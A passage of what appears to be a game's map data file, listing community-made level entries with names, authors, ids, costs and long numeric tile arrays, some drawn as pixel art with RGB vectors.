,0,0,170,177,13,199,105,105,105,105,1,0,0,0,0,0,0,0,0,0,0,0,189,0,188,199,105,105,105,105,1,0,0,0,0,0,0,0,0,0,0,0,13,3,189,199,105,105,105,105,1,0,0,0,0,0,0,0,0,0,0,0,170,179,13,1,90,105,105,90,1,0,0,0,0,0,0,0,0,0,0,0,9998,9998,9998,1,1,95,95,1,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,1,105,105,105,105,1,0,0,0,0,0,0,0,0,0,0,0,93,93,93,1,132,105,105,105,1,0,0,0,0,0,0,0,0,0,0,0,5,131,5,1,88,105,105,88,1,0,0,0,0,0,0,0,0,0,0,0,188,0,188,0,1,2,2,1,0,0,0]});
maps.push({name="No Jump Zone",author="sivi",id="#1672143843",direction="forward",cost=404,elevation=3,map=[0,1,1,1,1,1,1,1,1,2,2,111,1,1,1,1,1,1,1,1,0,1,1,90,14,90,14,90,1,111,111,111,1,90,14,90,14,90,1,1,0,1,14,14,14,14,14,14,1,112,112,112,1,14,14,14,14,14,14,1,0,1,90,14,93,14,14,9998,1,113,113,113,1,9998,14,14,93,14,90,1,0,1,14,14,14,14,9998,15,9998,14,14,14,9998,15,9998,14,14,14,14,1,0,1,90,14,14,9998,15,9998,14,14,14,14,14,9998,15,9998,14,14,90,1,0,1,14,14,9998,15,9998,14,14,9998,9998,9998,14,14,9998,15,9998,14,14,1,154,1,14,9998,9998,9998,14,14,9998,15,15,15,9998,14,14,9998,9998,9998,14,1,18,1,14,9998,15,9998,14,9998,15,15,15,15,15,9998,14,9998,15,9998,14,1,145,1,14,9998,15,9998,14,9998,15,15,15,15,15,9998,14,9998,15,9998,14,1,18,1,14,9998,15,9998,14,9998,15,15,15,15,15,9998,14,9998,15,9998,14,1,153,1,14,9998,15,9998,14,9998,15,15,15,15,15,9998,14,9998,15,9998,14,1,157,1,14,9998,9998,9998,14,14,9998,15,15,15,9998,14,14,9998,9998,9998,14,1,0,1,14,14,9998,15,9998,14,14,9998,9998,9998,14,14,9998,15,9998,14,14,1,0,1,90,14,14,9998,15,9998,14,14,14,14,14,9998,15,9998,14,14,90,1,0,1,14,14,14,14,9998,15,9998,14,14,14,9998,15,9998,14,14,14,14,1,0,1,90,14,94,14,14,9998,15,9998,14,9998,15,9998,14,14,94,14,90,1,0,1,14,14,14,14,14,14,15,14,14,14,15,14,14,14,14,14,14,1,0,1,1,90,14,90,14,9998,15,9998,14,9998,15,9998,14,90,14,90,1,1,0,1,1,1,1,1,1,1,1,2,2,114,1,1,1,1,1,1,1,1]});
maps.push({name="Die Already",author="ZpLit",id="#1672181630",direction="right",cost=193,elevation=0,map=[0,0,0,5,5,2,2,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,4,5,5,5,5,4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,1,105,105,1,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,1,105,105,1,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,105,105,105,105,16,0,0,0,1,0,0,0,0,0,0,0,0,0,0,15,105,105,105,105,15,0,0,1,0,0,0,0,0,0,0,0,0,0,0,15,106,65,65,106,15,0,1,0,0,0,0,0,0,0,0,0,0,0,0,15,107,65,65,107,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,108,90,108,108,15,0,0,0,0,0,0,0,0,11,11,11,0,0,0,15,94,108,108,108,15,14,13,12,11,11,11,11,11,45,88,45,0,0,0,15,108,108,108,90,108,108,107,106,105,129,45,45,31,95,5,5,0,0,0,15,108,108,108,108,108,108,75,75,105,45,88,45,45,95,5,2,0,0,0,15,108,108,108,108,108,108,75,75,105,45,88,45,45,95,5,2,0,0,0,15,94,108,108,94,108,108,107,106,105,129,45,45,31,95,5,5,0,0,0,15,15,15,15,15,15,14,13,12,11,11,11,11,11,45,88,45,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Whack A Mole",author="ZpLit",id="#1672195428",direction="forward",cost=196,elevation=6,map=[0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,31,92,25,45,45,45,45,25,92,31,0,0,0,0,0,0,0,0,0,0,145,0,0,45,45,45,45,0,0,145,0,0,0,0,0,0,0,0,0,0,31,92,25,45,45,45,45,25,92,31,0,0,0,0,0,0,0,0,0,0,0,0,0,9998,45,45,9998,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,90,11,11,90,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,11,11,11,11,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,111,111,111,111,1,0,0,0,0,0,0,0,37,92,31,0,51,51,51,51,51,51,51,51,51,51,51,51,0,31,92,37,145,0,0,0,51,51,51,51,51,51,51,51,51,51,51,51,0,0,0,145,37,92,31,0,51,51,51,51,51,51,51,51,51,51,51,51,0,31,92,37,145,0,0,0,51,51,51,51,51,51,51,51,51,51,51,51,0,0,0,145,37,92,31,0,51,51,51,51,51,51,51,51,51,51,51,51,0,31,92,37,0,0,0,0,0,0,0,1,17,17,17,17,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,11,11,11,11,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,11,11,11,11,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,88,2,2,88,1,0,0,0,0,0,0,0]});
maps.push({name="Whack The Moles",author="ZpLit",id="#1672195835",direction="forward",cost=156,elevation=6,map=[0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,31,31,31,45,45,45,45,31,31,31,0,0,0,0,0,0,0,0,0,0,31,92,25,45,45,45,45,25,92,31,0,0,0,0,0,0,0,0,0,0,31,31,31,45,45,45,45,31,31,31,0,0,0,0,0,0,0,0,0,0,0,0,0,45,45,45,45,0,0,0,0,0,0,0,0,0,0,0,0,0,31,31,31,45,45,45,45,31,31,31,0,0,0,0,0,0,0,0,0,0,31,92,25,45,45,45,45,25,92,31,0,0,0,0,0,0,0,0,0,0,31,31,31,45,45,45,45,31,31,31,0,0,0,0,0,0,0,0,0,0,0,0,0,45,45,45,45,0,0,0,0,0,0,0,0,0,0,0,0,0,31,31,31,45,45,45,45,31,31,31,0,0,0,0,0,0,0,0,0,0,31,92,25,45,45,45,45,25,92,31,0,0,0,0,0,0,0,0,0,0,31,31,31,45,45,45,45,31,31,31,0,0,0,0,0,0,0,0,0,0,0,0,0,1,11,11,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,11,11,11,11,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,88,2,2,88,1,0,0,0,0,0,0,0]});
maps.push({name="fly high",author="alli",id="#1672205188",direction="right",cost=349,elevation=13,map=[0,0,0,0,0,1,2,2,0,0,0,1,1,1,1,1,1,0,0,153,0,0,0,0,1,18,7,7,0,0,0,7,94,9998,12,17,24,1,187,5,0,0,0,0,1,17,7,7,0,0,0,7,12,12,12,18,9998,94,1,154,0,0,0,0,1,18,7,90,0,0,0,7,11,9998,12,18,20,23,1,0,0,0,0,0,1,18,7,7,0,0,0,7,10,12,12,17,20,20,24,1,0,0,0,0,1,17,7,90,0,0,0,7,9,12,12,18,20,20,20,1,0,0,0,1,24,18,7,7,0,0,0,9998,8,12,12,17,20,20,24,1,0,0,0,1,23,17,7,90,0,0,0,90,7,12,12,18,20,132,23,1,0,0,0,1,23,18,7,7,28,29,28,7,7,12,12,17,20,20,20,1,0,0,0,1,24,18,7,7,28,29,28,7,7,12,12,18,20,20,24,1,0,0,0,1,24,17,7,90,0,0,0,90,7,12,12,18,20,3,24,1,0,0,0,1,20,18,18,24,186,0,0,0,18,12,131,17,20,20,23,1,0,0,1,24,19,19,9998,128,77,77,77,24,18,17,18,18,20,20,23,1,0,1,93,24,21,21,21,9998,81,81,81,20,20,20,20,20,20,20,88,23,0,1,93,24,21,21,21,21,81,81,81,20,20,20,20,20,20,20,20,2,0,1,93,24,21,21,100,21,81,81,81,20,20,20,20,20,20,20,20,2,0,1,93,24,21,21,9998,21,77,77,77,20,20,20,20,20,20,20,88,24,0,0,1,1,1,1,22,24,75,75,75,24,20,20,20,20,20,20,23,1,0,0,0,0,0,0,1,1,24,24,24,1,20,23,24,20,20,24,24,1,0,0,0,0,0,0,0,0,1,1,1,0,1,1,1,1,1,1,1,0]});
maps.push({name="CAT",author="pee",id="#1672217501",direction="forward",cost=120,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,0,14,14,55,55,14,0,0,0,0,0,0,0,0,0,0,0,14,55,0,14,55,55,55,14,0,14,0,0,0,0,0,0,0,0,0,0,0,14,14,55,55,55,85,14,0,14,0,0,0,0,0,0,0,0,0,0,0,0,14,55,7,14,85,0,14,14,0,0,0,0,0,0,0,0,0,0,0,14,55,55,55,55,0,0,0,14,0,0,0,0,0,0,0,0,0,0,0,14,55,55,55,55,0,0,0,14,0,0,0,0,0,0,0,0,0,0,0,14,55,55,55,7,0,0,0,14,0,0,0,0,0,0,0,0,0,0,0,14,55,55,55,7,7,0,0,14,0,0,0,0,0,0,0,0,0,0,0,14,55,55,55,7,0,0,0,14,0,0,0,0,0,0,0,0,0,0,0,14,55,55,55,55,0,0,0,14,0,0,0,0,0,0,0,0,0,0,0,14,55,55,55,55,0,0,0,14,0,0,0,0,0,0,0,0,0,0,0,14,55,55,7,14,85,0,0,14,0,0,0,0,0,0,0,0,0,0,0,0,14,55,55,55,85,0,14,14,0,0,0,0,0,0,0,0,0,0,0,14,14,55,55,55,55,14,0,14,0,0,0,0,0,0,0,0,0,0,14,55,0,14,55,55,55,14,0,14,0,0,0,0,0,0,0,0,0,0,14,14,14,0,14,14,55,55,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0]});
maps.push({name="remember to jump",author="pee",id="#1672218309",direction="left",cost=165,elevation=0,map=[0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,35,35,35,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,35,35,37,35,35,35,35,5,0,0,0,0,0,0,0,0,0,0,5,35,35,37,37,37,35,35,35,35,5,0,0,0,0,0,0,0,0,5,35,35,37,37,37,37,37,37,35,35,35,5,0,0,0,0,0,0,0,5,35,37,37,39,39,37,37,37,37,35,35,5,0,0,0,0,0,0,5,35,37,37,39,39,39,39,37,37,37,35,35,35,5,0,0,0,0,2,5,37,37,39,39,43,43,39,39,37,37,37,35,35,5,0,0,0,0,2,5,37,39,39,43,43,43,139,39,37,37,37,35,35,5,0,0,0,0,0,0,65,39,39,43,93,93,44,39,39,37,37,35,5,0,0,0,0,0,0,0,5,39,43,43,93,93,43,39,39,37,37,35,5,0,0,0,0,0,0,0,0,5,39,43,43,43,43,39,39,37,35,5,0,0,0,0,0,0,0,0,0,0,5,39,39,39,39,39,37,35,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,39,39,138,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Fairy",author="pee",id="#1672219791",direction="left",cost=227,elevation=0,map=[0,0,0,0,0,93,0,1,1,1,0,0,0,0,0,0,0,0,2,2,0,0,0,1,94,85,5,124,124,5,0,0,0,0,0,0,5,5,5,85,0,0,1,5,5,93,5,5,5,5,5,5,5,5,5,5,124,124,124,85,0,1,5,5,5,64,64,64,64,64,64,5,5,5,124,124,124,1,1,1,0,5,5,5,64,64,91,1,1,64,64,62,5,146,146,124,124,124,121,124,5,5,5,5,5,64,64,64,64,64,75,64,62,64,64,146,39,124,121,39,2,5,5,5,64,64,64,64,64,64,75,64,62,62,64,64,146,39,121,124,2,5,5,5,64,64,91,1,1,64,64,64,62,64,64,146,39,124,121,39,5,5,5,5,5,64,64,64,64,64,64,62,64,146,146,124,124,85,121,124,0,5,5,5,5,5,5,5,5,64,62,5,5,124,124,124,124,85,124,124,0,5,5,5,5,93,5,5,64,64,5,5,5,5,124,124,1,1,1,1,0,0,5,5,94,85,5,5,5,5,5,5,5,5,5,124,124,124,124,85,0,0,0,0,5,93,5,124,124,5,1,0,0,0,0,5,5,124,124,85,0,0,0,0,0,0,94,5,5,5,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="MASK OFF",author="pee",id="#1672220595",direction="forward",cost=241,elevation=0,map=[0,0,0,0,0,0,0,0,23,2,2,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,23,0,0,0,0,23,0,0,0,0,0,0,0,0,0,0,0,0,0,23,0,0,0,0,0,0,23,0,0,0,0,0,0,0,0,0,0,0,0,23,0,0,0,0,0,0,23,0,0,0,0,0,0,0,0,0,0,0,21,21,21,21,21,21,21,21,21,21,0,0,0,0,0,0,0,0,0,0,21,66,66,67,67,65,66,66,67,21,0,0,0,0,0,0,0,0,0,0,21,65,66,67,67,65,66,66,66,21,0,0,0,0,0,0,0,0,0,0,21,65,66,66,67,65,65,66,67,21,0,0,0,0,0,0,0,0,0,0,21,65,65,66,67,93,65,66,67,21,0,0,0,0,0,0,0,0,0,0,21,65,66,66,67,93,65,66,67,21,0,0,0,0,0,0,0,0,0,0,21,65,66,66,67,94,65,66,67,21,0,0,0,0,0,0,0,0,0,0,21,65,66,66,67,67,65,66,67,21,0,0,0,0,0,0,0,0,0,0,21,65,66,66,67,67,65,66,67,21,0,0,0,0,0,0,0,0,0,0,21,65,65,66,67,67,65,100,67,21,0,0,0,0,0,0,0,0,0,0,21,65,65,66,66,67,65,66,67,21,0,0,0,0,0,0,0,0,0,0,21,21,21,21,21,21,21,21,21,21,0,0,0,0,0,0,0,0,0,0,0,23,0,0,0,0,0,0,23,0,0,0,0,0,0,0,0,0,0,0,0,23,0,0,0,0,0,0,23,0,0,0,0,0,0,0,0,0,0,0,0,0,23,0,0,0,0,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,23,2,2,23,0,0,0,0,0,0,0,0]});
maps.push({name="BUTT",author="pee",id="#1672225124",direction="left",cost=336,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Vector(63,54,58),Vector(116,98,103),Vector(99,82,85),2,2,Vector(148,97,76),0,0,0,0,0,0,0,0,0,0,0,0,0,Vector(101,81,80),Vector(125,86,73),Vector(145,91,68),Vector(154,98,72),Vector(164,101,71),Vector(157,93,65),Vector(148,97,76),Vector(148,97,76),Vector(148,97,76),Vector(198,143,123),Vector(198,143,123),Vector(229,137,88),Vector(184,125,103),Vector(153,92,65),Vector(145,98,74),Vector(113,71,50),Vector(95,59,41),Vector(93,63,50),Vector(83,54,42),Vector(103,68,56),Vector(156,110,97),Vector(166,106,79),Vector(178,105,68),Vector(193,116,77),Vector(200,121,83),Vector(187,114,79),Vector(223,117,62),Vector(227,132,90),Vector(230,148,119),Vector(235,154,114),Vector(235,154,114),Vector(165,136,133),Vector(235,154,114),Vector(220,134,83),Vector(214,136,94),Vector(201,127,83),Vector(177,112,77),Vector(148,97,76),Vector(147,90,67),Vector(150,87,61),Vector(157,90,58),Vector(185,113,77),Vector(208,131,92),Vector(215,131,93),Vector(224,139,99),Vector(210,132,94),Vector(215,125,81),Vector(224,134,90),Vector(231,145,105),Vector(213,162,146),Vector(206,157,142),Vector(204,145,121),Vector(235,154,114),Vector(237,150,104),Vector(223,140,97),Vector(219,135,94),Vector(210,129,91),Vector(198,126,91),Vector(195,122,85),Vector(196,121,83),Vector(204,125,86),Vector(212,132,93),Vector(222,140,99),Vector(233,144,102),Vector(242,152,109),Vector(227,143,104),Vector(222,138,94),Vector(234,144,95),Vector(245,156,110),Vector(230,196,189),Vector(230,195,186),Vector(236,179,151),Vector(254,174,134),Vector(253,164,118),Vector(242,153,109),Vector(241,150,107),Vector(238,148,105),Vector(235,149,104),Vector(232,147,101),Vector(231,147,101),Vector(235,149,105),Vector(236,150,107),Vector(240,152,109),Vector(246,156,109),Vector(253,161,115),Vector(240,153,110),Vector(225,139,94),Vector(240,149,100),Vector(255,169,124),Vector(253,233,227),Vector(255,246,243),Vector(255,232,217),Vector(255,188,148),Vector(255,169,120),Vector(255,167,122),Vector(253,162,116),Vector(249,158,111),Vector(243,158,110),Vector(243,157,109),Vector(243,157,109),Vector(246,158,111),Vector(248,161,116),Vector(250,162,117),Vector(250,161,113),Vector(253,163,114),Vector(247,160,111),Vector(240,154,107),Vector(240,149,100),Vector(243,157,112),Vector(254,232,225),Vector(255,254,255),Vector(255,248,244),Vector(255,182,138),Vector(255,163,108),Vector(255,173,128),Vector(255,172,127),Vector(253,172,126),Vector(252,171,125),Vector(251,171,126),Vector(251,171,125),Vector(252,170,120),Vector(252,165,118),Vector(252,162,115),Vector(250,161,113),Vector(249,159,110),Vector(240,151,104),Vector(235,151,104),Vector(229,137,88),Vector(226,139,94),Vector(252,229,222),Vector(255,246,243),Vector(255,246,243),Vector(253,190,150),Vector(254,166,114),Vector(255,171,125),Vector(255,179,132),Vector(255,183,137),Vector(255,183,139),Vector(255,184,141),Vector(255,182,138),Vector(255,179,129),Vector(255,171,122),Vector(254,164,115),Vector(249,161,113),Vector(243,154,105),Vector(225,140,93),Vector(203,122,74),Vector(200,109,60),Vector(204,115,70),Vector(248,221,214),Vector(255,246,243),Vector(255,246,243),Vector(245,204,184),Vector(247,174,136),Vector(255,160,111),Vector(255,177,130),Vector(255,186,141),Vector(255,189,145),Vector(255,190,145),Vector(255,188,141),Vector(255,181,132),Vector(255,175,126),Vector(253,167,119),Vector(247,161,113),Vector(238,151,102),Vector(211,131,86),Vector(196,109,60),Vector(213,119,71),Vector(232,141,98),Vector(238,197,184),Vector(249,237,237),Vector(255,246,243),Vector(255,246,243),Vector(252,200,172),Vector(252,136,74),Vector(254,164,116),Vector(255,181,137),Vector(255,191,146),Vector(255,190,146),Vector(255,188,143),Vector(255,185,135),Vector(255,179,130),Vector(254,170,122),Vector(253,163,114),Vector(228,140,93),Vector(192,111,71),Vector(207,139,105),Vector(230,151,115),Vector(252,170,137),Vector(237,197,185),Vector(245,231,229),Vector(255,246,243),Vector(255,246,243),Vector(254,226,210),Vector(250,157,107),Vector(253,160,115),Vector(255,168,122),Vector(255,185,140),Vector(255,186,142),Vector(255,186,141),Vector(255,183,134),Vector(255,179,129),Vector(252,168,120),Vector(246,156,106),Vector(214,127,82),Vector(178,98,61),Vector(240,149,100),Vector(230,151,115),Vector(255,208,197),Vector(255,246,243),Vector(255,246,243),Vector(255,246,243),Vector(255,246,243),Vector(255,246,243),Vector(255,246,243),Vector(247,164,117),Vector(247,132,67),Vector(255,157,107),Vector(255,176,130),Vector(255,185,142),Vector(255,179,133),Vector(255,171,124),Vector(242,154,106),Vector(216,128,81),Vector(192,109,66),Vector(168,92,55),2,Vector(198,143,123),Vector(220,160,139),Vector(251,246,244),Vector(255,246,243),Vector(255,246,243),Vector(255,246,243),Vector(255,246,243),Vector(255,246,243),Vector(251,225,212),Vector(251,208,183),Vector(255,210,179),Vector(248,171,131),Vector(239,145,97),Vector(233,144,97),Vector(232,144,96),Vector(229,142,94),Vector(222,135,87),Vector(225,138,92),Vector(212,131,91),2,Vector(110,37,12),Vector(155,94,64),Vector(242,229,231),Vector(255,246,243),Vector(255,246,243),Vector(255,246,243),Vector(255,246,243),Vector(255,246,243),Vector(255,246,243),Vector(255,246,243),Vector(255,246,243),Vector(241,170,131),Vector(225,121,69),Vector(212,123,75),Vector(218,129,81),Vector(224,137,89),Vector(225,138,91),Vector(250,163,115),Vector(248,168,124),0,0,0,0,Vector(124,113,109),Vector(255,246,243),Vector(231,205,199),Vector(230,180,165),Vector(242,173,146),Vector(252,184,146),Vector(255,185,139),Vector(255,179,132),Vector(254,172,123),Vector(254,169,119),Vector(253,173,125),Vector(255,174,127),Vector(249,160,116),Vector(198,115,73),Vector(237,152,106),Vector(252,172,128),0,0,0,0,0,Vector(124,113,109),Vector(216,153,126),Vector(252,164,123),Vector(248,153,107),Vector(253,163,114),Vector(255,168,118),Vector(255,168,120),Vector(255,174,124),Vector(255,178,129),Vector(255,179,132),Vector(255,177,132),Vector(248,160,117),Vector(197,114,72),Vector(233,146,101),Vector(247,163,120),0,0,0,0,0,0,Vector(177,98,55),Vector(248,139,80),Vector(240,136,82),Vector(249,152,102),Vector(255,163,115),Vector(255,166,119),Vector(255,170,122),Vector(255,173,125),Vector(255,173,128),Vector(252,166,122),Vector(237,151,107),Vector(202,118,74),Vector(227,139,93),Vector(231,148,103),0,0,0,0,0,0,0,0,Vector(157,72,37),Vector(233,138,89),Vector(255,173,117),Vector(255,169,115),Vector(255,174,118),Vector(255,176,122),Vector(255,175,125),Vector(255,165,116),Vector(253,153,102),Vector(243,141,87),Vector(249,144,88),0,0,0,0,0,0,0,0,0,0,0,Vector(141,85,56),Vector(136,82,55),Vector(139,84,56),Vector(140,85,58),Vector(139,85,60),Vector(132,79,55),Vector(126,74,50),Vector(124,72,45),0,0]});
maps.push({name="Counter Strike",author="pee",id="#1672246784",direction="left",cost=401,elevation=0,map=[45,45,45,45,48,48,48,48,48,52,52,52,57,57,61,61,61,61,2,2,48,48,48,48,48,52,52,52,52,52,57,57,57,61,61,64,64,64,64,61,52,52,52,52,52,52,57,57,57,57,57,61,61,61,64,64,17,17,64,64,52,57,57,57,57,57,57,61,61,61,61,61,64,64,64,21,5,5,5,21,57,57,61,61,61,61,61,61,64,64,64,64,64,21,21,5,5,5,5,11,61,61,61,64,64,64,64,64,64,14,13,9,7,7,5,5,5,9,64,64,64,64,64,64,13,13,13,7,7,7,5,5,5,5,5,5,9,16,64,61,64,16,16,7,5,5,5,5,5,5,5,5,5,9,13,13,64,64,64,61,63,5,5,5,5,5,5,5,5,5,5,5,64,64,64,64,64,61,61,61,20,5,5,5,5,5,5,5,5,5,5,5,7,21,64,64,61,61,61,61,63,5,5,5,5,5,5,141,21,7,5,5,5,5,21,64,64,64,64,64,64,16,9,5,21,5,5,64,64,64,64,7,5,5,5,5,7,7,94,64,64,64,9,5,7,5,7,64,61,61,64,64,64,7,5,5,5,5,5,5,61,64,13,5,5,5,64,64,61,61,61,61,64,64,64,64,16,13,7,5,61,64,93,5,5,7,64,64,61,61,57,61,61,61,61,64,64,64,16,13,61,64,19,5,64,64,64,64,64,61,57,57,57,57,61,61,61,64,64,64,61,64,64,5,64,64,64,64,64,61,57,52,52,57,57,57,61,61,61,61,2,64,9,94,64,64,64,64,64,61,57,52,52,52,52,57,57,57,57,57,2,64,64,64,64,61,61,61,61,61,57,52,48,48,52,52,52,52,52,52,61,61,61,61,61,61,57,57,57,57,57,52,48,48,48,48,48,48,48,48]});
maps.push({name="bbsupkkcom",author="pee",id="#1672246851",direction="left",cost=277,elevation=0,map=[Vector(185,185,186),0,0,0,0,0,0,Vector(235,195,188),Vector(237,149,87),Vector(237,140,30),Vector(238,153,18),Vector(238,168,25),Vector(238,176,56),Vector(237,190,122),Vector(234,220,192),0,0,0,2,2,Vector(185,185,186),Vector(185,185,186),Vector(205,205,205),0,0,0,Vector(251,179,139),Vector(253,115,8),Vector(253,121,0),Vector(253,139,30),Vector(252,147,64),Vector(252,154,62),Vector(254,195,56),Vector(255,238,62),Vector(255,236,100),Vector(255,238,188),0,Vector(177,160,128),Vector(102,64,19),Vector(146,136,128),Vector(185,185,186),Vector(202,202,202),Vector(162,162,162),Vector(177,181,182),0,Vector(255,180,146),Vector(254,92,0),Vector(252,126,53),Vector(250,185,170),Vector(250,210,220),Vector(250,217,230),Vector(249,204,221),Vector(250,183,175),Vector(254,214,126),Vector(255,237,104),Vector(248,196,97),Vector(162,127,78),Vector(136,100,9),Vector(115,74,1),Vector(136,128,130),Vector(178,171,168),Vector(207,207,207),Vector(190,190,191),Vector(161,167,171),Vector(160,153,140),Vector(219,110,60),Vector(254,147,123),0,0,0,0,0,0,Vector(254,239,235),Vector(205,141,90),Vector(212,132,21),Vector(174,121,10),Vector(136,106,34),Vector(154,134,52),Vector(187,177,147),Vector(177,172,169),Vector(207,207,207),Vector(185,185,186),Vector(184,184,181),Vector(176,178,149),Vector(150,139,124),Vector(165,162,168),0,0,0,0,0,0,Vector(136,135,128),Vector(74,46,26),Vector(133,77,17),Vector(199,155,37),Vector(212,202,153),Vector(221,218,167),0,Vector(178,173,170),Vector(195,195,195),Vector(190,190,193),Vector(185,184,169),Vector(180,180,151),Vector(158,164,163),Vector(131,136,137),Vector(131,129,127),Vector(193,192,192),0,0,Vector(216,216,217),Vector(83,73,66),Vector(45,22,0),Vector(58,36,11),Vector(132,113,104),Vector(235,218,155),Vector(255,255,186),0,0,Vector(224,219,216),Vector(172,171,172),Vector(166,168,169),Vector(185,189,165),Vector(178,178,157),Vector(156,156,158),Vector(148,148,148),Vector(129,128,126),Vector(110,106,103),Vector(165,162,159),Vector(163,161,160),Vector(51,44,37),Vector(29,10,0),Vector(64,47,29),Vector(153,146,139),0,0,Vector(248,239,161),0,0,0,0,Vector(192,189,186),Vector(169,160,131),Vector(161,160,148),Vector(157,157,160),Vector(145,145,145),Vector(132,133,133),Vector(117,116,116),Vector(110,108,104),Vector(55,49,43),Vector(25,15,6),Vector(78,68,60),Vector(183,182,181),0,0,0,Vector(248,240,176),Vector(230,227,182),0,0,0,Vector(255,244,239),Vector(234,174,143),Vector(169,157,148),Vector(132,136,139),Vector(138,137,137),Vector(133,133,134),Vector(113,114,116),Vector(106,106,107),Vector(88,80,72),Vector(67,59,51),Vector(190,192,195),0,0,0,0,Vector(248,241,195),Vector(229,225,174),0,0,0,Vector(251,226,222),Vector(255,192,165),0,Vector(193,197,199),Vector(137,137,135),Vector(123,121,120),Vector(124,122,121),Vector(140,132,125),Vector(93,85,77),Vector(48,42,35),Vector(101,94,87),Vector(197,197,197),0,0,0,Vector(248,241,207),Vector(229,224,175),0,0,0,Vector(249,230,226),Vector(250,196,169),0,0,0,Vector(160,158,157),Vector(154,148,142),Vector(123,120,116),Vector(50,51,53),Vector(30,29,27),Vector(37,27,15),Vector(58,45,27),Vector(146,140,132),0,0,Vector(252,246,215),Vector(230,224,181),0,0,0,Vector(249,237,236),Vector(251,202,175),0,0,Vector(184,183,182),Vector(149,147,145),Vector(118,113,110),Vector(90,88,85),Vector(50,51,53),Vector(35,34,33),Vector(40,37,31),Vector(40,31,15),Vector(50,34,7),Vector(113,99,78),Vector(198,197,198),Vector(255,252,223),Vector(232,228,192),0,0,0,0,Vector(255,224,199),Vector(228,209,186),Vector(155,159,162),Vector(134,133,132),Vector(87,84,82),Vector(90,88,85),Vector(113,109,105),Vector(45,39,34),Vector(35,31,28),Vector(44,39,34),Vector(47,41,29),Vector(45,36,19),Vector(51,36,5),Vector(88,67,29),Vector(179,163,111),0,0,0,0,0,Vector(206,187,170),Vector(166,153,123),Vector(142,144,142),Vector(88,87,87),Vector(105,103,102),0,0,Vector(150,147,145),Vector(66,58,51),Vector(43,33,21),Vector(50,42,31),Vector(55,46,30),Vector(53,45,24),Vector(71,58,17),Vector(126,102,24),Vector(108,88,38),0,0,0,Vector(177,178,179),Vector(162,164,159),Vector(160,161,133),Vector(105,108,92),Vector(153,154,157),0,0,0,0,Vector(213,213,213),Vector(114,107,100),Vector(61,46,28),Vector(54,42,20),Vector(59,51,30),Vector(99,88,38),Vector(116,103,30),Vector(77,57,5),Vector(149,140,134),Vector(212,212,212),Vector(169,169,169),Vector(177,177,177),Vector(150,153,155),Vector(131,116,97),Vector(209,191,156),0,0,0,0,0,0,0,Vector(175,173,170),Vector(92,80,64),Vector(85,68,27),Vector(118,103,38),Vector(101,91,35),Vector(81,65,19),Vector(144,137,129),Vector(166,166,166),Vector(193,193,193),Vector(157,157,157),Vector(148,150,152),Vector(231,219,219),Vector(255,224,200),Vector(252,233,205),0,0,